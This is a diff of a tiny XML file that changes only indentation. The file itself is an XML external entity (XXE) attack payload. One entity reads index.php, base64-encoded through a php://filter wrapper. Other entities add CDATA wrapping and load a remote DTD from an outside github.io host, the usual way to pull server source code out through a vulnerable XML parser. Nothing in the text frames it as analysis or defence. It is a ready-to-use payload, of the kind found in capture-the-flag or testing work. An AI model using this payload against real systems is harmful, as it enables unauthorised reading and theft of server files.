@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE channel [
-  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php">
   <!ENTITY % start "<![CDATA[">
   <!ENTITY % end "]]>">
   <!ENTITY % dtd SYSTEM "https://slavalaki.github.io/join.dtd">
